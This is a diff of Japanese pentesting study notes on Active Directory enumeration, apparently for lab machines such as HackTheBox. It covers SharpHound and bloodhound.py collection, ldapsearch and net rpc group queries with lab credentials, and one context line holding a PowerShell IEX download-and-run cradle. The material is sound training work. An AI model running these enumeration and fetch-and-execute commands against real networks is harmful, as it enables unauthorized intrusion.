@@ -247,51 +247,7 @@ kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 P@$$w0rd
 ```
 
-### BloodHound
 
-sharphoundで情報収集
-
-https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
-
-```bash
-wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -O SharpHound.ps1
-```
-
-```powershell
-PS C:\Tools> Import-Module .\Sharphound.ps1
-```
-
-```powershell
-Get-Help Invoke-BloodHound
-#全てのオブジェクトを収集
-Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
-```
-
-```bash
-＃bloodhoundおよびneo4j（noSQLデータベース)のインストール
-sudo apt update && sudo apt install -y bloodhound
-```
-
-ファイルの配送
-
-[ここを参照してkaliに配送](../FileTransfers.md)
-
-```bash
-sudo neo4j start
-bloodhound
-```
-
-upload Dataからzipファイルをアップロードする
-
-![image-20230415112408970](img/ActiveDirectory_enume/image-20230415112408970.png)
-
-uploadが完了したらupload progressを閉じる
-
-![image-20230415112644111](img/ActiveDirectory_enume/image-20230415112644111.png)
-
-![image-20230415113043958](img/ActiveDirectory_enume/image-20230415113043958.png)
-
-* Analysisタブを適当にぽちぽちして目的のコンピューターやユーザを右クリックして`Mark user as Owned`に登録していく。
 
 ### ユーザ一覧の取得
 
@@ -421,6 +377,8 @@ powershell.exe -NoProfile -ExecutionPolicy unrestricted IEX(New-Object System.Ne
 ![image-20230220230444452](img/ActiveDirectory_enume/image-20230220230444452.png)
 
 ※末尾に実行したコマンドを付ける
+
+
 
 ### SPNの調査
 
@@ -565,4 +523,105 @@ PS C:\Tools\active_directory>
 ```
 runas /user:＜ユーザー名＞ ＜コマンド＞
 ```
+
+
+
+### BloodHound
+
+#### sharphoundで情報収集
+
+https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
+
+```bash
+wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -O SharpHound.ps1
+```
+
+```powershell
+PS C:\Tools> Import-Module .\Sharphound.ps1
+```
+
+```powershell
+Get-Help Invoke-BloodHound
+#全てのオブジェクトを収集
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
+```
+
+```bash
+＃bloodhoundおよびneo4j（noSQLデータベース)のインストール
+sudo apt update && sudo apt install -y bloodhound
+```
+
+ファイルの配送
+
+[ここを参照してkaliに配送](../FileTransfers.md)
+
+#### bloodhound.pyでリモートで情報収集
+
+https://github.com/fox-it/BloodHound.py
+
+```bash
+[~/Documents/tools]
+git clone https://github.com/fox-it/BloodHound.py.git 
+python setup.py install
+```
+
+```bash
+./bloodhound.py -u svc-alfresco -p s3rvice -d htb.local -ns 10.129.192.240
+```
+
+※ディレクトリ配下に.jsonファイルが複数できる
+
+![image-20230430113636254](img/ActiveDirectory_enume/image-20230430113636254.png)
+
+
+
+#### bloodhoundの実行
+
+```bash
+sudo neo4j start
+bloodhound
+```
+
+upload Dataからzipファイルをアップロードする
+
+![image-20230415112408970](img/ActiveDirectory_enume/image-20230415112408970.png)
+
+uploadが完了したらupload progressを閉じる
+
+![image-20230415112644111](img/ActiveDirectory_enume/image-20230415112644111.png)
+
+![image-20230415113043958](img/ActiveDirectory_enume/image-20230415113043958.png)
+
+* Analysisタブを適当にぽちぽちして目的のコンピューターやユーザを右クリックして`Mark user as Owned`に登録していく。
+
+### リモートサーバーからの情報収集
+
+LDAPを利用してグループの所属メンバーを確認
+
+```bash
+# "remote management Users"の列挙
+ldapsearch -H ldap://10.129.192.240 -x -b DC=htb,DC=local | grep -A 11 -i "Remote Management Users"
+```
+
+| option                        | 説明                                                         |
+| ----------------------------- | ------------------------------------------------------------ |
+| -A 行数, --after-context=行数 | 検索文字列が見つかった行から後ろの行を指定した行数分表示します。 |
+| -i, --ignore-case             | 大文字と小文字の区別をしません。                             |
+
+![image-20230430085035894](img/ActiveDirectory_enume/image-20230430085035894.png)
+
+net rpcを利用してグループに所属するメンバーをさらに絞り込む
+
+```bash
+# "Privileged IT Accounts"のnet rpc group membersを表示
+net rpc group members 'Privileged IT Accounts' -W 'htb.local' -I '10.129.192.240' -U'svc-alfresco'%'s3rvice' 2>&1
+```
+
+![image-20230430085152314](img/ActiveDirectory_enume/image-20230430085152314.png)
+
+```bash
+net rpc group members 'Service Accounts' -W 'htb.local' -I '10.129.192.240' -U'svc-alfresco'%'s3rvice' 2>&1
+```
+
+![image-20230430085209485](img/ActiveDirectory_enume/image-20230430085209485.png)
 
